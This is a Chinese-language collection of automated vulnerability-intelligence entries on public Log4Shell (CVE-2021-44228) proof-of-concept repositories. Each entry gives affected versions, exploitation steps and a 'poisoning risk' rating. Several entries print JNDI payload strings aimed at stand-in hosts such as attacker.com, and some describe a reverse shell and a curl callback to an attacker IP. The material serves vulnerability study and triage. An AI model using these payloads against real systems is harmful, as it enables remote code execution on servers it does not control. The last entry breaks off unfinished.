**来源**: [CVE-2021-44228-asd58584388_CVE-2021-44228.md](../2021/CVE-2021-44228-asd58584388_CVE-2021-44228.md)

## CVE-2021-44228 Apache Log4j2 Log4Shell 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 应用程序使用受影响的Log4j2版本，允许记录用户可控的输入，且启用了message lookup substitution。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，也被称为Log4Shell，是Apache Log4j2中的一个严重漏洞。攻击者通过发送包含特定格式的恶意字符串（例如`${jndi:ldap://attacker.com/exploit}`）到应用程序，如果应用程序使用Log4j2记录该字符串，则Log4j2会尝试通过JNDI从攻击者控制的LDAP服务器检索恶意代码，并执行该代码。

**有效性：**
根据提供的漏洞信息、搜索结果和漏洞利用代码，此漏洞的POC代码是有效的。大量报告表明该漏洞已被广泛利用。

**投毒风险：**
提供的漏洞利用代码存储库主要包含漏洞分析和利用说明，以及用于设置LDAP和HTTP服务器的示例。`README.md`详细解释了漏洞的利用过程，并提供了相关的图片说明。`LICENSE`文件表明作者声明了代码的版权和使用许可。`marshalsec`目录可能包含利用所需的工具或者payload。总体来看，该仓库主要目的是为了分析和演示该漏洞，而非恶意投毒。但由于代码包含执行恶意代码的步骤，因此存在一定风险。我判断投毒的可能性是10%。因为`marshalsec`工具本身具备一定的攻击性，如果用户不熟悉该工具，可能会被误导或者滥用。

**利用方式：**
1.  攻击者构造包含JNDI查找的恶意请求字符串，例如 `${jndi:ldap://evil.com/a}`。
2.  应用程序使用存在漏洞的Log4j2版本记录此字符串。
3.  Log4j2解析字符串，发起JNDI请求到攻击者控制的LDAP服务器 `evil.com`。
4.  LDAP服务器返回一个指向恶意Java类的URL。
5.  Log4j2加载并执行该恶意Java类，导致远程代码执行。
6.  攻击者可以在目标服务器上执行任意命令。

**项目地址:** [asd58584388/CVE-2021-44228](https://github.com/asd58584388/CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #21

**来源**: [CVE-2021-44228-axisops_CVE-2021-44228.md](../2021/CVE-2021-44228-axisops_CVE-2021-44228.md)

## CVE-2021-44228-Apache Log4j2 JNDI 远程代码执行

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 to 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用了受影响的Log4j2版本，且允许Log消息查找替换。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j 2 中的一个严重漏洞，它允许攻击者通过控制日志消息或日志消息参数来执行任意代码。漏洞原理是 Log4j 2 启用了 JNDI 功能，该功能允许从 LDAP 服务器等远程位置加载代码。攻击者可以构造包含 JNDI 查找的恶意日志消息，例如 `${jndi:ldap://attacker.com/evil}`。当 Log4j 2 记录此消息时，它会尝试从 attacker.com 加载并执行代码。

**利用方式：**

1.  攻击者向使用 Log4j2 的应用程序发送包含恶意 JNDI 查找的请求。这些请求可以通过多种方式发送，例如 HTTP 请求头、POST 请求参数、WebSocket 消息等，只要这些数据会被Log4j记录即可。
2.  应用程序使用 Log4j2 记录接收到的请求，包括恶意 JNDI 查找字符串。
3.  Log4j2 解析日志消息，识别 JNDI 查找字符串，并尝试通过 JNDI 连接到指定的 LDAP 服务器（`attacker.com`）。
4.  LDAP 服务器返回一个包含恶意 Java 类的响应。
5.  Log4j2 加载并执行恶意 Java 类，从而允许攻击者在服务器上执行任意代码。

**有效性：**

根据漏洞库信息和搜索结果，此漏洞的POC是有效的，并且已经在野外被广泛利用。

**投毒风险：**

提供的漏洞利用代码是一个缓解脚本，旨在移除 Log4j JAR 文件中易受攻击的 `JndiLookup` 类。虽然该脚本本身旨在缓解漏洞，但仍然存在一些投毒风险：

*   **依赖项：**  该脚本依赖于 `PyYAML` 和系统命令 `zip` 和 `zipinfo`。如果这些依赖项被篡改或存在漏洞，可能会导致脚本执行恶意代码。
*   **配置：**  该脚本使用 `config.yaml` 文件进行配置。如果攻击者可以修改此配置文件，他们可能会将脚本指向恶意位置或执行其他恶意操作。
*   **脚本逻辑：** 脚本尝试从指定目录查找并修改JAR文件。 存在一定风险，即如果脚本逻辑存在缺陷，脚本可能会意外删除或损坏重要的JAR文件，导致服务中断，但造成远程代码执行的可能性较小。 投毒风险预估为5%。

**项目地址:** [axisops/CVE-2021-44228](https://github.com/axisops/CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #22

**来源**: [CVE-2021-44228-b-abderrahmane_CVE-2021-44228-playground.md](../2021/CVE-2021-44228-b-abderrahmane_CVE-2021-44228-playground.md)

## CVE-2021-44228-Apache Log4j2-JNDI注入

**漏洞编号:** CVE-2021-44228

**漏洞类型:** JNDI注入

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 <= version <= 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用受影响的Log4j2版本，且启用了message lookup substitution。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-44228，又名Log4Shell，是Apache Log4j2中的一个严重漏洞。该漏洞源于Log4j2的JNDI功能未对攻击者控制的LDAP和其他JNDI相关端点提供保护。攻击者可以通过控制日志消息或日志消息参数，利用message lookup substitution功能从LDAP服务器加载并执行任意代码，从而实现远程代码执行(RCE)。

**漏洞利用方式：**

1.  **构造恶意请求：** 攻击者构造包含JNDI查找表达式的恶意请求，例如`${jndi:ldap://attacker.com/evil}`。该表达式会被记录到日志中。
2.  **JNDI查找：** Log4j2解析日志消息时，会识别并执行JNDI查找表达式。
3.  **LDAP请求：** Log4j2向攻击者控制的LDAP服务器(attacker.com)发起LDAP请求。
4.  **恶意代码加载：** LDAP服务器响应一个包含恶意Java类的URL。
5.  **远程代码执行：** Log4j2从URL加载并执行恶意Java类，导致RCE。

**有效性：**
根据漏洞库信息和搜索引擎结果，该漏洞利用的POC代码是有效的。搜索引擎结果中多个条目（如CISA，Palo Alto Networks，Sysdig，Cloudflare, NVD等）都确认了该漏洞的存在以及公开的POC代码的存在。漏洞库信息也明确指出该漏洞可以被利用来执行任意代码。

**投毒风险：**
提供的漏洞利用代码只包含GNU GPL协议文本，是一个许可协议，不包含任何可执行的代码。因此，判断此仓库中不存在作者隐藏的投毒代码，风险为0%。 该协议只声明了软件的使用许可，无法直接用于漏洞利用或者进行恶意攻击，与Log4Shell漏洞本身没有直接关系。


**项目地址:** [b-abderrahmane/CVE-2021-44228-playground](https://github.com/b-abderrahmane/CVE-2021-44228-playground)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #23

**来源**: [CVE-2021-44228-cuijiung_log4j-CVE-2021-44228.md](../2021/CVE-2021-44228-cuijiung_log4j-CVE-2021-44228.md)

## CVE-2021-44228 - Apache Log4j2 JNDI 注入

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行和服务器完全控制

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用受影响版本的 Log4j2 并且启用了消息查找替换。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-44228，又称Log4Shell，是Apache Log4j2中的一个严重漏洞。攻击者可以通过向Log4j2记录的日志消息中注入恶意的JNDI查找字符串来利用此漏洞。当Log4j2处理包含`\${jndi:}`语法的字符串时，它会尝试通过JNDI（Java Naming and Directory Interface）来解析该字符串。攻击者可以利用这一点，将JNDI指向恶意的LDAP或其他JNDI服务，从而使Log4j2从攻击者控制的服务器上加载并执行任意Java代码，导致远程代码执行(RCE)。

**有效性：**

根据漏洞库信息、搜索结果和提供的POC代码，可以确定该漏洞利用代码是有效的。搜索结果中多个链接（例如NVD, CISA, Unit 42, Cloudflare, Red Hat, Oracle, Microsoft, Sysdig, Picus Security, CrowdStrike）都表明CVE-2021-44228是一个被广泛利用的RCE漏洞。POC代码通过`logger.error("${jndi:ldap://127.0.0.1:1389/any}")`演示了如何触发JNDI查找，如果目标系统存在漏洞，则会尝试连接到指定的LDAP服务器，从而允许远程代码执行。

**投毒风险：**

提供的代码仓库主要包含一个简单的 Maven 项目，包括 `pom.xml` 和 `Main.java` 文件。

*   `pom.xml`: 定义了项目依赖，仅包含 `log4j-core`，版本为 `2.14.1`，这是一个受漏洞影响的版本。
*   `Main.java`: 包含一个简单的 Log4j2 日志记录器，它会记录一条包含 JNDI 注入payload的错误消息。

此仓库的投毒风险较低，约为 5%。主要原因是：

1.  **代码量少且简单**：整个仓库的代码非常少，容易审查。
2.  **目的明确**：代码的目的是为了演示 CVE-2021-44228 漏洞的利用，`Main.java` 中的 payload 清晰可见。
3.  **无恶意行为**：代码本身除了触发 JNDI 查找外，没有其他恶意行为，例如文件操作、网络连接等。

但是，仍然存在极低的风险，比如构建脚本或IDE配置中可能存在隐藏的恶意代码。所以给出5%的风险评估。

**利用方式：**

1.  **攻击者控制日志消息：** 攻击者需要找到一种方法，使包含恶意JNDI查找字符串（例如 `${jndi:ldap://attacker.com/evil}`）的消息被Log4j2记录。
2.  **触发JNDI查找：** 当Log4j2记录包含恶意JNDI查找字符串的消息时，它会尝试通过JNDI连接到攻击者指定的LDAP服务器。
3.  **恶意LDAP服务器：** 攻击者需要设置一个恶意的LDAP服务器，该服务器会返回一个指向恶意Java类的URL。
4.  **远程代码执行：** Log4j2会从URL下载并执行恶意Java类，从而导致远程代码执行。攻击者可以通过这种方式在目标系统上执行任意命令。

**项目地址:** [cuijiung/log4j-CVE-2021-44228](https://github.com/cuijiung/log4j-CVE-2021-44228)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #24

**来源**: [CVE-2021-44228-d4ngkh04w_CVE-2021-44228-Apache-Log4j.md](../2021/CVE-2021-44228-d4ngkh04w_CVE-2021-44228-Apache-Log4j.md)

## CVE-2021-44228-Log4Shell-RCE

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行(RCE)

**影响应用:** Apache Log4j2

**危害等级:** 极高危，可能导致完全控制受影响的系统

**影响版本:** 2.0-beta9 到 2.15.0 (不包含安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用受影响版本的Log4j2，且启用了message lookup substitution功能。攻击者能够控制Log4j2记录的日志消息或参数。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-44228，又名Log4Shell，是一个存在于Apache Log4j2中的严重远程代码执行漏洞。该漏洞利用了Log4j2的JNDI（Java Naming and Directory Interface）特性，允许攻击者通过控制日志消息或参数，注入恶意的JNDI查找字符串。当Log4j2解析并执行这些字符串时，它会从攻击者控制的LDAP或其他JNDI服务下载并执行任意Java代码，从而实现远程代码执行。 

**有效性：**根据漏洞库信息和搜索结果，此漏洞影响广泛，且存在公开可用的漏洞利用代码，因此该漏洞的利用是有效的。

**投毒风险：**提供的Dockerfile用于构建包含app.jar的镜像。Exploit.java代码尝试建立一个反向shell连接到 `host.docker.internal` 的9000端口。该代码本身并没有发现明显的投毒行为，而是实现了漏洞利用的基本功能，即建立反向shell。`host.docker.internal` 在docker 容器中可以解析为主机的ip地址。因此，投毒风险评估为0%。

**利用方式：**
1.  攻击者找到一个应用程序，该程序使用易受攻击版本的Log4j2并记录用户可控的输入。
2.  攻击者将恶意JNDI查找字符串（例如 `${jndi:ldap://attacker.com/Exploit}`）注入到这些输入中。
3.  当Log4j2记录包含恶意字符串的日志消息时，它会尝试解析JNDI查找。
4.  Log4j2连接到攻击者控制的LDAP服务器（或其它JNDI服务）。
5.  攻击者的LDAP服务器返回一个指向恶意Java类的URL。
6.  Log4j2从URL下载并执行恶意Java类，从而实现远程代码执行。例如提供的Exploit.java。
7.  Exploit.java 代码，会尝试创建一个反向shell，连接到攻击者指定的 `host:port` ，从而控制目标系统。

**项目地址:** [d4ngkh04w/CVE-2021-44228-Apache-Log4j](https://github.com/d4ngkh04w/CVE-2021-44228-Apache-Log4j)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #25

**来源**: [CVE-2021-44228-fabioeletto_hka-seminar-log4shell.md](../2021/CVE-2021-44228-fabioeletto_hka-seminar-log4shell.md)

## CVE-2021-44228 - Apache Log4j2 JNDI 远程代码执行漏洞

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 高危，允许攻击者执行任意代码

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用了受影响版本的 Log4j2，并且启用了 message lookup substitution。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是 Apache Log4j2 中的一个严重漏洞，它允许攻击者通过 JNDI 注入执行任意代码。漏洞利用方式如下：

1.  **攻击者发送恶意请求：** 攻击者向目标系统发送一个包含特定格式的字符串（例如 `${jndi:ldap://attacker.com/exploit}`）的请求，这个字符串会被 Log4j2 记录。
2.  **Log4j2 解析恶意字符串：** 当 Log4j2 尝试记录包含`${jndi:...}`的字符串时，它会触发 JNDI lookup。
3.  **JNDI 发起 LDAP 查询：** JNDI 会根据 URL (例如 `ldap://attacker.com/exploit`) 发起 LDAP 查询请求攻击者控制的 LDAP 服务器。
4.  **LDAP 服务器返回恶意引用：** 攻击者的 LDAP 服务器返回一个包含恶意 Java 类的引用。
5.  **Log4j2 加载并执行恶意代码：** Log4j2 尝试从指定的 URL 加载并实例化这个 Java 类，从而执行攻击者提供的任意代码。

**有效性：**

根据提供的漏洞信息和搜索结果，该漏洞是真实存在的，并且存在公开可用的 PoC。提供的漏洞利用代码库是一个用于演示 Log4Shell 漏洞的教育项目，因此其有效性是为了演示漏洞而设计的。

**投毒风险：**

评估此代码库的投毒风险较低，约为 10%。

*   代码库的 `README.md` 文件明确声明其目的是为了教育和演示 Log4Shell 漏洞，并警告用户不要在生产环境中使用。
*   代码库结构清晰，主要包含一个易受攻击的 Spring Boot 应用程序 (`vulnerable-app`)，一个模拟恶意 LDAP 服务器的 `marshalsec` fork，和一个提供恶意 Java 类的 HTTP 服务器 (`payload-server`)。
*   虽然存在通过修改 `Exploit.class` 文件来植入恶意代码的可能性，但这种投毒行为相对容易被发现，因为其主要目的是演示漏洞，所以更可能是测试后门连接，并非投毒代码。
*   代码贡献者 Fabio Eletto 已经明确声明了代码的用途，降低了恶意使用的可能性。

但是，用户仍然需要谨慎使用此代码库，务必在隔离的环境中进行测试，并仔细审查代码以确保安全。

**项目地址:** [fabioeletto/hka-seminar-log4shell](https://github.com/fabioeletto/hka-seminar-log4shell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #26

**来源**: [CVE-2021-44228-julian911015_Log4j-Scanner-Exploit.md](../2021/CVE-2021-44228-julian911015_Log4j-Scanner-Exploit.md)

## CVE-2021-44228-Apache Log4j2-JNDI注入

**漏洞编号:** CVE-2021-44228

**漏洞类型:** JNDI注入

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3 和 2.3.1)

**利用条件:** 目标系统使用了受影响的 Log4j2 版本，且允许 message lookup substitution

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228（Log4Shell）是 Apache Log4j2 中的一个严重漏洞，它允许攻击者通过 JNDI 注入执行远程代码。攻击者可以通过控制日志消息或日志消息参数，利用 JNDI 功能，从 LDAP 服务器加载恶意代码。 

**有效性：**
根据漏洞库信息和搜索结果，此漏洞是真实且已被广泛利用的。提供的 POC 代码尝试通过构造包含 JNDI 查找的恶意 payload，触发漏洞。

**投毒风险：**
代码主要功能是利用 Log4Shell 漏洞进行扫描和利用。虽然代码本身是为了利用漏洞，但存在一些潜在的风险，可能被恶意修改后进行投毒：

*   **Payload 修改：** 攻击者可以修改 payload，使其执行恶意操作，例如下载并执行其他恶意软件。
*   **LDAP 服务器：** 攻击者可能控制 LDAP 服务器，导致被攻击者下载恶意 payload。
*   **后门植入：** 攻击者可能会在扫描或利用过程中，通过漏洞在目标系统上植入后门，以便长期控制。

综合来看，代码本身具有一定的风险，需要谨慎使用。这里给出10%的投毒风险评估，因为代码的功能和目标较为明确，主要风险在于使用者可能被引导至恶意的LDAP服务器。

**利用方式：**

1.  **构建恶意 Payload：** 攻击者构造包含 JNDI 查找的字符串，例如 `${jndi:ldap://attacker.com/Exploit}`。
2.  **触发日志记录：** 将恶意 payload 注入到应用程序的日志消息中。这可以通过多种方式实现，例如通过 HTTP 请求头（User-Agent、X-Forwarded-For 等）、POST 请求参数或其他任何会被记录到日志中的输入。
3.  **JNDI 查找：** 当 Log4j2 尝试记录包含恶意 payload 的日志消息时，它会触发 JNDI 查找。
4.  **远程代码执行：** JNDI 查找会导致应用程序连接到攻击者控制的 LDAP 服务器，并下载和执行恶意代码。

提供的漏洞利用代码通过以下步骤尝试利用漏洞：

1.  **启动 LDAP 和 HTTP 服务器：** 使用 `JNDIExploit` 工具启动一个恶意的 LDAP 服务器，用于提供恶意 payload。同时启动一个 HTTP 服务器，用于托管 payload 文件。
2.  **扫描目标 URL：** 从指定的 URL 字典中读取 URL，并向这些 URL 发送包含恶意 payload 的 HTTP 请求。
3.  **注入 Payload 到 HTTP 头：** 将 payload 注入到 `X-Api-Version`、`User-Agent` 和 `X-Forwarded-For` 等常见的 HTTP 头中。
4.  **注入 Payload 到 URL 参数：** 将 payload 注入到 URL 参数中。

通过以上步骤，攻击者可以尝试触发目标应用程序的 Log4j2 漏洞，并执行远程代码。

**项目地址:** [julian911015/Log4j-Scanner-Exploit](https://github.com/julian911015/Log4j-Scanner-Exploit)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #27

**来源**: [CVE-2021-44228-khaidtraivch_CVE-2021-44228-Log4Shell-.md](../2021/CVE-2021-44228-khaidtraivch_CVE-2021-44228-Log4Shell-.md)

## CVE-2021-44228-Log4Shell

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行和完全系统控制

**影响版本:** 2.0-beta9 到 2.15.0 (不包括安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用受影响的 Log4j2 版本，并且允许消息查找替换功能（默认启用）。攻击者需要能够控制 Log4j2 记录的日志消息或参数。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，又称 Log4Shell，是一个存在于 Apache Log4j2 中的远程代码执行漏洞。该漏洞源于 Log4j2 的 JNDI (Java Naming and Directory Interface) 功能，该功能允许在日志消息中执行 JNDI 查找。如果攻击者可以控制日志消息的内容，他们就可以注入恶意的 JNDI 查找字符串，从而导致 Log4j2 从攻击者控制的 LDAP 或其他 JNDI 服务加载并执行任意代码。

**有效性：**
根据漏洞库信息和搜索结果，CVE-2021-44228 是一个被广泛利用的严重漏洞。 搜索结果中提供了多个关于漏洞分析、缓解措施和利用的链接。虽然提供的漏洞利用代码仓库只包含一个 README.md 文件，信息很少。但考虑到CVE本身的严重性和公开性，判断存在有效的PoC。

**投毒风险：**
提供的漏洞利用代码仓库 `/tmp/b3e5418f03d45523b0a6001074bd0614/README.md` 只包含简单的描述信息 "CVE-2021-44228-Log4Shell-Kiểm thử xâm nhập" (越南语，意思是渗透测试)。**无法直接从该文件判断是否存在投毒代码。** 但从代码仓库的简洁程度来看，作者可能意图引导用户从其他渠道获取EXP，增加了恶意代码嵌入的可能性，**因此存在一定的投毒风险。风险评估为10%**。

**利用方式：**
漏洞利用的核心在于构造包含恶意 JNDI 查找的日志消息，例如：`${jndi:ldap://attacker.com/evil}`。当 Log4j2 记录包含此字符串的消息时，它会尝试连接到 `attacker.com` 上的 LDAP 服务器，并加载和执行从该服务器返回的 Java 代码。

**攻击步骤：**
1.  攻击者找到一个使用 Log4j2 的应用程序，该应用程序会将攻击者可控的数据记录到日志中。
2.  攻击者将包含恶意 JNDI 查找字符串的payload注入到应用程序的输入字段，例如 HTTP Header (User-Agent, X-Forwarded-For等等)、POST 参数、GET 参数或其他任何会被记录到日志中的数据。
3.  当应用程序记录包含该字符串的日志消息时，Log4j2 会尝试执行 JNDI 查找。
4.  如果应用程序配置允许，Log4j2 将连接到攻击者控制的 JNDI 服务器（例如 LDAP），并下载和执行恶意 Java 代码。

**缓解措施：**
*   升级 Log4j2 到 2.17.1 或更高版本。
*   如果无法升级，可以设置系统属性 `log4j2.formatMsgNoLookups=true` 或环境变量 `LOG4J_FORMAT_MSG_NO_LOOKUPS=true`，以禁用消息查找替换功能。
*   删除 `JndiLookup` 类。

**项目地址:** [khaidtraivch/CVE-2021-44228-Log4Shell-](https://github.com/khaidtraivch/CVE-2021-44228-Log4Shell-)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #28

**来源**: [CVE-2021-44228-mgueye3_Log4Shell.md](../2021/CVE-2021-44228-mgueye3_Log4Shell.md)

## CVE-2021-44228-Apache Log4j2-JNDI 注入

**漏洞编号:** CVE-2021-44228

**漏洞类型:** JNDI 注入

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 2.0-beta9 to 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用受影响的 Log4j2 版本，且允许出站网络连接。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-44228 (Log4Shell) 漏洞存在于 Apache Log4j2 中，由于其 JNDI 功能未对攻击者控制的 LDAP 和其他 JNDI 相关端点进行保护。攻击者可以控制日志消息或日志消息参数，从而在启用消息查找替换时执行从 LDAP 服务器加载的任意代码。

**有效性：**
根据漏洞库信息和大量已公开的漏洞利用案例，此漏洞的利用是有效的。大量资料表明，该漏洞在野外被广泛利用。

**投毒风险：**
提供的漏洞利用代码是一个JSON文件，其中包含一组flag，这些flag很可能是CTF挑战或者渗透测试演练中的结果，而不是实际的漏洞利用代码。因此，可以认为不存在投毒代码。

**利用方式：**
1.  攻击者构造包含 JNDI 查找表达式的恶意字符串，例如 `${jndi:ldap://attacker.com/evil}`。
2.  目标应用程序使用存在漏洞的 Log4j2 版本记录此字符串。
3.  Log4j2 尝试解析 JNDI 查找表达式，并连接到攻击者控制的 LDAP 服务器（或 RMI、DNS 等）。
4.  LDAP 服务器返回一个包含恶意 Java 类的响应。
5.  Log4j2 加载并执行该恶意 Java 类，从而导致远程代码执行。

需要注意的是，从 Log4j 2.15.0 开始，此行为已默认禁用。在 2.16.0 版本（以及 2.12.2、2.12.3 和 2.3.1）中，此功能已完全删除。


**项目地址:** [mgueye3/Log4Shell](https://github.com/mgueye3/Log4Shell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #29

**来源**: [CVE-2021-44228-michaelsanford_Log4Shell-Honeypot.md](../2021/CVE-2021-44228-michaelsanford_Log4Shell-Honeypot.md)

## CVE-2021-44228-Log4Shell-Honeypot

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可能导致远程代码执行和数据泄露

**影响版本:** 2.0-beta9 to 2.15.0 (excluding security releases 2.12.2, 2.12.3, and 2.3.1)

**利用条件:** 目标系统使用存在漏洞的Log4j2版本，且允许log message lookup substitution

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是一种严重的远程代码执行 (RCE) 漏洞，存在于 Apache Log4j 2.0-beta9 到 2.15.0 版本（不包括安全版本 2.12.2、2.12.3 和 2.3.1）中。该漏洞源于 Log4j2 JNDI 功能在配置、日志消息和参数中，未能充分保护免受攻击者控制的 LDAP 和其他 JNDI 相关端点的攻击。

**利用方式：**

攻击者可以控制日志消息或日志消息参数，从而执行从 LDAP 服务器加载的任意代码。这是通过在日志消息中插入包含 JNDI 查找的恶意字符串来实现的，例如 `${jndi:ldap://attacker.com/evil}`。当 Log4j2 处理此日志消息时，它会尝试连接到攻击者控制的 LDAP 服务器，并执行服务器返回的恶意代码。

**有效性：**

根据漏洞库信息、搜索结果以及漏洞利用代码，可以判断该漏洞利用的POC代码有效。网上存在大量的利用该漏洞的POC，并且该漏洞已被广泛利用。

**投毒风险：**

提供的代码是Log4Shell Honeypot，目的是为了检测和防御Log4Shell攻击，而不是利用Log4Shell进行攻击。Dockerfile 构建了一个 Python 应用，用于模拟易受攻击的 Log4j2 环境，通过检测特定模式（例如 `${jndi:`）来识别潜在的攻击。主要目的是捕获攻击尝试的相关信息，例如攻击来源 IP 地址、攻击载荷等。尽管从技术角度讲，可以修改该 Honeypot 以包含恶意代码，但从代码的主要功能来看，其目的在于防御，而不是攻击。虽然整体投毒风险较低，但如果有人修改了 Honeypot 的代码，增加了反向shell或者其他恶意代码，那么投毒风险会增加。因此，给出10%的投毒风险评估。

总而言之，这是一个高危漏洞，攻击者可以利用它来远程执行代码。但是，提供的代码是一个honeypot，旨在检测此类攻击，虽然存在被修改后用作恶意用途的可能，但是可能性相对较低。

**项目地址:** [michaelsanford/Log4Shell-Honeypot](https://github.com/michaelsanford/Log4Shell-Honeypot)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #30

**来源**: [CVE-2021-44228-moften_Log4Shell.md](../2021/CVE-2021-44228-moften_Log4Shell.md)

## CVE-2021-44228 - Apache Log4j2 Log4Shell JNDI注入

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行

**影响应用:** Apache Log4j2

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 2.0-beta9 到 2.15.0 (不包含安全版本 2.12.2, 2.12.3, 和 2.3.1)

**利用条件:** 目标系统使用受影响的Log4j2版本，并且允许出站网络连接。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228 (Log4Shell) 是一个关键的远程代码执行漏洞，存在于 Apache Log4j 2.0-beta9 到 2.15.0 版本中 (不包括安全版本 2.12.2、2.12.3 和 2.3.1)。此漏洞源于 Log4j2 JNDI 功能在配置、日志消息和参数中，未能防止攻击者控制的 LDAP 和其他 JNDI 相关端点。 攻击者可以通过控制日志消息或日志消息参数，在启用消息查找替换时，执行从 LDAP 服务器加载的任意代码。

**有效性：**
根据漏洞描述和提供的PoC代码，该漏洞的利用是有效的。PoC 通过 JNDI 注入 LDAP URL 来触发漏洞，从而导致远程代码执行。

**投毒风险：**
该仓库的投毒风险评估为10%。虽然PoC本身旨在演示漏洞利用，但 `Exploit.java` 包含执行 `curl http://TU_IP:9999/pwned` 的指令，表明攻击者可以轻易地替换成更具破坏性的命令。`main.py`脚本本身看起来没有明显的恶意代码，但如果攻击者修改`Exploit.java` 并诱导用户使用，则存在风险。 README中包含了从github上克隆`marshalsec`的步骤，如果`marshalsec`库被投毒，也会导致风险。因此，需要仔细审查和验证。

**利用方式：**
1.  **确定目标：** 找到使用易受攻击的 Log4j2 版本的应用程序。
2.  **构造Payload：** 构造包含 JNDI 查找的恶意字符串。例如： `${jndi:ldap://attacker.com/Exploit}`。
3.  **触发日志记录：** 将 Payload 注入到应用程序将会记录的输入字段中，例如 HTTP Headers (User-Agent, Referer, X-Forwarded-For), POST 参数等。
4.  **恶意LDAP服务器：**设置一个恶意的LDAP服务器，当Log4j2尝试去lookup这个URL的时候，从HTTP服务器上获取恶意的Java Class文件并执行。
5.  **远程代码执行：** Log4j2 将连接到攻击者的 LDAP 服务器，检索并执行恶意 Java 代码，从而允许攻击者在目标系统上执行任意命令。

请注意，成功利用此漏洞需要目标应用程序启用消息查找替换，并且能够解析 JNDI 查找。较高版本的 Log4j 默认禁用了此功能，从而缓解了此漏洞。

**项目地址:** [moften/Log4Shell](https://github.com/moften/Log4Shell)

**漏洞详情:** [CVE-2021-44228](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)

---

## POC #31

**来源**: [CVE-2021-44228-mr-won_Log4shell.md](../2021/CVE-2021-44228-mr-won_Log4shell.md)

## CVE-2021-44228 - Apache Log4j2 Log4Shell RCE

**漏洞编号:** CVE-2021-44228

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Log4j2

**危害等级:** 🔥 치명적 (CVSS 10.0) - 远程代码执行，完全控制受影响系统

**影响版本:** 2.0-beta9 ~ 2.14.1

**利用条件:** 目标系统使用了存在漏洞的Log4j2版本，且允许Log4j2记录攻击者可控的输入（例如，HTTP请求头、用户输入等），消息lookup substitution is enabled

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-44228，又名Log4Shell，是一个存在于Apache Log4j2中的远程代码执行漏洞。攻击者通过将恶意的JNDI lookup字符串（例如 `${jndi:ldap://attacker.com:1389/exploit}`）注入到Log4j2可以记录的任何输入中，即可触发该漏洞。

**有效性：**

